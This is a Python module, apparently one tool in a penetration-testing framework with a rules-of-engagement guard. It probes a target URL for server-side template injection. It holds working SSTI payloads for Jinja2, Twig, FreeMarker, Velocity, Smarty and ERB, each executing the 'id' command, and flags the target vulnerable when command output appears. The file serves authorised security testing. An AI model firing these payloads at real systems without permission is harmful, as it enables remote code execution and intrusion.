from __future__ import annotations

from .chain_engine import register_tool
from .config import load_engine
from . import http as _http


_PAYLOADS = [
    ("jinja2", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ("jinja2_alt", "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}"),
    ("twig", "{{['id']|filter('system')}}"),
    ("freemarker", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"),
    ("velocity", "#set($e='')$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')"),
    ("smarty", "{php}echo shell_exec('id');{/php}"),
    ("erb", "<%= `id` %>"),
    ("handlebars", "{{#with 'constructor'}}...{{/with}}"),
]

_MARKERS = ["uid=", "gid=", "groups=", "root:", "www-data"]


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _send(url, param, payload, method, headers, timeout, verify, roe_guard):
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            if method.upper() == "POST":
                r = c.post(url, data={param: payload},
                           headers=headers or {})
            else:
                r = c.get(url, params={param: payload},
                          headers=headers or {})
        return {"status": r.status_code, "body": (r.text or "")[:4000]}
    except _http.ROEBlock as e:
        return {"status": None, "error": "ROE_BLOCK: " + str(e)}
    except _http.TimeoutException:
        return {"status": None, "error": "timeout"}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def _tool_ssti_harvest(orch, args):
    url = args.get("url") or orch.target
    param = args.get("param") or "q"
    method = (args.get("method") or "GET").upper()
    headers = args.get("headers") or {}
    verify = _verify_tls()
    roe_guard = getattr(orch, "roe_guard", None)

    findings = []
    attempts = []
    for engine_name, payload in _PAYLOADS:
        r = _send(url, param, payload, method, headers, 12, verify, roe_guard)
        attempts.append({"engine": engine_name, "status": r.get("status"),
                         "error": r.get("error")})
        body = r.get("body") or ""
        for m in _MARKERS:
            if m in body:
                findings.append({"engine": engine_name, "marker": m,
                                 "preview": body[:300]})
                break
        if findings:
            break

    if findings:
        first = findings[0]
        return {
            "verdict": "VULNERABLE",
            "reason": (f"SSTI RCE confirmed via {first['engine']} "
                       f"(marker: {first['marker']})"),
            "evidence": {"findings": findings, "attempts": attempts},
        }
    live = [a for a in attempts if a.get("status") is not None]
    if not live:
        return {"verdict": "UNKNOWN", "reason": "all SSTI probes failed"}
    return {"verdict": "PASS",
            "reason": f"no RCE markers across {len(live)} SSTI payloads",
            "evidence": {"attempts": attempts}}


register_tool("ssti_harvest", _tool_ssti_harvest)
